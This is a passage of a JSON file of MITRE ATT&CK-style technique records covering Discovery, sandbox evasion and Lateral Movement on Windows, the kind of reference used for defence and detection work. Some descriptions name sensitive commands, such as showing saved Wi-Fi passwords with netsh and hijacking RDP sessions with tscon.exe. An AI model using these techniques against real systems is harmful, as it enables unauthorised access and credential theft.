    "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such asPing,net viewusingNet, or, on ESXi servers,esxcli network diag ping.Adversaries may also analyze data from local host files (ex:C:\\Windows\\System32\\Drivers\\etc\\hostsor/etc/hosts) or other passive means (such as localArpcache entries) in order to discover the presence of remote systems in an environment.Adversaries may also target discovery of network infrastructure as well as leverageNetwork Device CLIcommands on network devices to gather detailed information about systems within a network (e.g.show cdp neighbors,show arp).[1][2]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:45.016243",
    "subtechniques": []
  },
  {
    "technique_id": "T1518",
    "name": "Software Discovery",
    "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information fromSoftware Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Such software may be deployed widely across the environment for configuration management or security reasons, such asSoftware Deployment Tools, and may allow adversaries broad access to infect devices or move laterally.Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable toExploitation for Privilege Escalation.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:48.378764",
    "subtechniques": [
      {
        "id": "T1518.001",
        "name": "Security Software Discovery"
      }
    ]
  },
  {
    "technique_id": "T1518.001",
    "name": "Security Software Discovery",
    "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information fromSecurity Software Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Example commands that can be used to obtain security software information arenetsh,reg querywithReg,dirwithcmd, andTasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.Adversaries may also utilize theCloud APIto discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Software Discovery",
    "parent_technique_id": "T1518",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:51.842342"
  },
  {
    "technique_id": "T1082",
    "name": "System Information Discovery",
    "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information fromSystem Information Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Tools such asSysteminfocan be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through thesystemsetupconfiguration tool on macOS. As an example, adversaries with user-level access can execute thedf -aHcommand to obtain currently mounted disks and associated freely available space. Adversaries may also leverage aNetwork Device CLIon network devices to gather detailed system information (e.g.show version).[1]On ESXi servers, threat actors may gather system information from various esxcli utilities, such assystem hostname get,system version get, andstorage filesystem list(to list storage volumes).[2][3]Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.[4][5][6]System Information Discoverycombined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.[7][8]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:55.482956",
    "subtechniques": []
  },
  {
    "technique_id": "T1614",
    "name": "System Location Discovery",
    "description": "Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information fromSystem Location Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.[1][2][3]Windows API functions such asGetLocaleInfoWcan also be used to determine the locale of the host.[1]In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.[4][5]Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.[6][2]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:58.834197",
    "subtechniques": [
      {
        "id": "T1614.001",
        "name": "System Language Discovery"
      }
    ]
  },
  {
    "technique_id": "T1614.001",
    "name": "System Language Discovery",
    "description": "Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.[1]There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such asQuery Registryand calls toNative APIfunctions.[2]For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry keyHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Languageor parsing the outputs of Windows API functionsGetUserDefaultUILanguage,GetSystemDefaultUILanguage,GetKeyboardLayoutListandGetUserDefaultLangID.[3][4][5]On a macOS or Linux system, adversaries may querylocaleto retrieve the value of the$LANGenvironment variable.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Location Discovery",
    "parent_technique_id": "T1614",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:02.202070"
  },
  {
    "technique_id": "T1016",
    "name": "System Network Configuration Discovery",
    "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples includeArp,ipconfig/ifconfig,nbtstat, androute.Adversaries may also leverage aNetwork Device CLIon network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g.show ip route,show ip interface).[1][2]On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the commandesxcli network nic listwill retrieve the MAC address, whileesxcli network ip interface ipv4 getwill retrieve the local IPv4 address.[3]Adversaries may use the information fromSystem Network Configuration Discoveryduring automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:05.706114",
    "subtechniques": [
      {
        "id": "T1016.001",
        "name": "Internet Connection Discovery"
      },
      {
        "id": "T1016.002",
        "name": "Wi-Fi Discovery"
      }
    ]
  },
  {
    "technique_id": "T1016.001",
    "name": "Internet Connection Discovery",
    "description": "Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as usingPing,tracert, and GET requests to websites.Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Network Configuration Discovery",
    "parent_technique_id": "T1016",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:09.149776"
  },
  {
    "technique_id": "T1016.002",
    "name": "Wi-Fi Discovery",
    "description": "Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part ofAccount Discovery,Remote System Discovery, and other discovery orCredential Accessactivity to support both ongoing and future campaigns.Adversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available throughnetsh wlan show profilesto enumerate Wi-Fi names and thennetsh wlan show profile \"Wi-Fi name\" key=clearto show a Wi-Fi networkâ€™s corresponding password.[1][2][3]Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls towlanAPI.dllNative APIfunctions.[4]On Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under/etc/NetworkManager/system-connections/.[5]On macOS, the password of a known Wi-Fi may be identified withsecurity find-generic-password -wa wifiname(requires admin username/password).[6]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Network Configuration Discovery",
    "parent_technique_id": "T1016",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:12.491330"
  },
  {
    "technique_id": "T1049",
    "name": "System Network Connections Discovery",
    "description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.[1][2][3]Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.Utilities and commands that acquire this information includenetstat, \"net use,\" and \"net session\" withNet. In Mac and Linux,netstatandlsofcan be used to list current connections.who -aandwcan be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices andNetwork Device CLImay be used (e.g.show ip sockets,show tcp brief).[4]On ESXi servers, the commandesxi network ip connection listcan be used to list active network connections.[5]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:15.917770",
    "subtechniques": []
  },
  {
    "technique_id": "T1033",
    "name": "System Owner/User Discovery",
    "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by usingOS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information fromSystem Owner/User Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Various utilities and commands may acquire this information, includingwhoami. In macOS and Linux, the currently logged in user can be identified withwandwho. On macOS thedscl . list /Users | grep -v '_'command can also be used to enumerate user accounts. Environment variables, such as%USERNAME%and$USER, may also be used to access this information.On network devices,Network Device CLIcommands such asshow usersandshow sshcan be used to display users currently logged into the device.[1][2]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:19.430186",
    "subtechniques": []
  },
  {
    "technique_id": "T1007",
    "name": "System Service Discovery",
    "description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such assc query,tasklist /svc,systemctl --type=service, andnet start.Adversaries may use the information fromSystem Service Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:22.796549",
    "subtechniques": []
  },
  {
    "technique_id": "T1124",
    "name": "System Time Discovery",
    "description": "An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows orsystemsetupon macOS.[1][2][3]These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.[4][5]System time information may be gathered in a number of ways, such as withNeton Windows by performingnet time \\hostnameto gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by usingw32tm /tz.[2]In addition, adversaries can discover device uptime through functions such asGetTickCount()to determine how long it has been since the system booted up.[6]On network devices,Network Device CLIcommands such asshow clock detailcan be used to see the current time configuration.[7]On ESXi servers,esxcli system clock getcan be used for the same purpose.In addition, system calls â€“ such astime()â€“ have been used to collect the current time on Linux devices.[8]On macOS systems, adversaries may use commands such assystemsetup -gettimezoneortimeIntervalSinceNowto gather current time zone information or current date and time.[9][10]This information could be useful for performing other techniques, such as executing a file with aScheduled Task/Job[11], or to discover locality information based on time zone to assist in victim targeting (i.e.System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.[12]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:26.165407",
    "subtechniques": []
  },
  {
    "technique_id": "T1673",
    "name": "Virtual Machine Discovery",
    "description": "An adversary may attempt to enumerate running virtual machines (VMs) after gaining access to a host or hypervisor. For example, adversaries may enumerate a list of VMs on an ESXi hypervisor using aHypervisor CLIsuch asesxcliorvim-cmd(e.g.esxcli vm process list or vim-cmd vmsvc/getallvms).[1][2]Adversaries may also directly leverage a graphical user interface, such as VMware vCenter, in order to view virtual machines on a host.Adversaries may use the information fromVirtual Machine Discoveryduring discovery to shape follow-on behaviors. Subsequently discovered VMs may be leveraged for follow-on activities such asService StoporData Encrypted for Impact.[1]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:29.513042",
    "subtechniques": []
  },
  {
    "technique_id": "T1497",
    "name": "Virtualization/Sandbox Evasion",
    "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned fromVirtualization/Sandbox Evasionduring automated discovery to shape follow-on behaviors.[1]Adversaries may use several methods to accomplishVirtualization/Sandbox Evasionsuch as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.[2]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:32.753450",
    "subtechniques": [
      {
        "id": "T1497.001",
        "name": "System Checks"
      },
      {
        "id": "T1497.002",
        "name": "User Activity Based Checks"
      },
      {
        "id": "T1497.003",
        "name": "Time Based Evasion"
      }
    ]
  },
  {
    "technique_id": "T1497.001",
    "name": "System Checks",
    "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned fromVirtualization/Sandbox Evasionduring automated discovery to shape follow-on behaviors.[1]Specific checks will vary based on the target and/or adversary, but may involve behaviors such asWindows Management Instrumentation,PowerShell,System Information Discovery, andQuery Registryto obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment.Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also useFile and Directory Discoveryto check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such asmalware,sample, orhash.Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.[2]In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.[3]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Virtualization/Sandbox Evasion",
    "parent_technique_id": "T1497",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:36.053149"
  },
  {
    "technique_id": "T1497.002",
    "name": "User Activity Based Checks",
    "description": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned fromVirtualization/Sandbox Evasionduring automated discovery to shape follow-on behaviors.[1]Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks[2], browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro[3]or waiting for a user to double click on an embedded image to activate.[4]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Virtualization/Sandbox Evasion",
    "parent_technique_id": "T1497",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:39.328488"
  },
  {
    "technique_id": "T1497.003",
    "name": "Time Based Evasion",
    "description": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex:Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduledMulti-Stage Channelsto avoid analysis and scrutiny.[1]Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such asPings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.[2][3]Another variation, commonly referred to as API hammering, involves making various calls toNative APIfunctions in order to delay execution (while also potentially overloading analysis environments with junk data).[4][5]Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.[6]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Virtualization/Sandbox Evasion",
    "parent_technique_id": "T1497",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:42.679592"
  },
  {
    "technique_id": "T1210",
    "name": "Exploitation of Remote Services",
    "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.Â A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.An adversary may need to determine if the remote system is in a vulnerable state, which may be done throughNetwork Service Discoveryor other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.There are several well-known vulnerabilities that exist in common services such as SMB[1]and RDP[2]as well as applications that may be used within internal networks such as MySQL[3]and web server services.[4][5]Additionally, there have been a number of vulnerabilities in VMware vCenter installations, which may enable threat actors to move laterally from the compromised vCenter server to virtual machines or even to ESXi hypervisors.[6]Depending on the permissions level of the vulnerable remote service an adversary may achieveExploitation for Privilege Escalationas a result of lateral movement exploitation as well.",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:46.045550",
    "subtechniques": []
  },
  {
    "technique_id": "T1534",
    "name": "Internal Spearphishing",
    "description": "After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporatingImpersonation.[1]For example, adversaries may leverageSpearphishing AttachmentorSpearphishing Linkas part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials throughInput Captureon sites that mimic login interfaces.Adversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.[2]",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:49.383365",
    "subtechniques": []
  },
  {
    "technique_id": "T1570",
    "name": "Lateral Tool Transfer",
    "description": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e.,Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing overSMB/Windows Admin Sharesto connected network shares or with authenticated connections viaRemote Desktop Protocol.[1]Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, andftp. In some cases, adversaries may be able to leverageWeb Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.[2]",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:52.725330",
    "subtechniques": []
  },
  {
    "technique_id": "T1563",
    "name": "Remote Service Session Hijacking",
    "description": "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.Adversaries may commandeer these sessions to carry out actions on remote systems.Remote Service Session Hijackingdiffers from use ofRemote Servicesbecause it hijacks an existing session rather than creating a new session usingValid Accounts.[1][2]",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:56.073875",
    "subtechniques": [
      {
        "id": "T1563.002",
        "name": "RDP Hijacking"
      }
    ]
  },
  {
    "technique_id": "T1563.002",
    "name": "RDP Hijacking",
    "description": "Adversaries may hijack a legitimate userâ€™s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).[1]Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console,c:\\windows\\system32\\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or prompts to the user.[2]This can be done remotely or locally and with active or disconnected sessions.[3]It can also lead toRemote System Discoveryand Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.[4]",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Remote Service Session Hijacking",
    "parent_technique_id": "T1563",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:19:59.418112"
  },
  {
    "technique_id": "T1021",
    "name": "Remote Services",
    "description": "Adversaries may useValid Accountsto log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).[1][2]They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain, or management platforms for internal virtualization environments such as VMware vCenter.Legitimate applications (such asSoftware Deployment Toolsand other administrative programs) may utilizeRemote Servicesto access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, includingVNCto send the screen and control buffers andSSHfor secure file transfer.[3][4][5]Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.[6][7][4]",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:02.749968",
    "subtechniques": [
      {
        "id": "T1021.001",
        "name": "Remote Desktop Protocol"
      },
      {
        "id": "T1021.002",
        "name": "SMB/Windows Admin Shares"
      },
      {
        "id": "T1021.003",
        "name": "Distributed Component Object Model"
      },
      {
        "id": "T1021.005",
        "name": "VNC"
      },
      {
        "id": "T1021.006",
        "name": "Windows Remote Management"
      }
    ]
  },
  {
    "technique_id": "T1021.001",
    "name": "Remote Desktop Protocol",
    "description": "Adversaries may useValid Accountsto log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).[1]Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with theAccessibility FeaturesorTerminal Services DLLfor Persistence.[2]",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Remote Services",
    "parent_technique_id": "T1021",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:06.196292"
  },
  {
    "technique_id": "T1021.002",
    "name": "SMB/Windows Admin Shares",
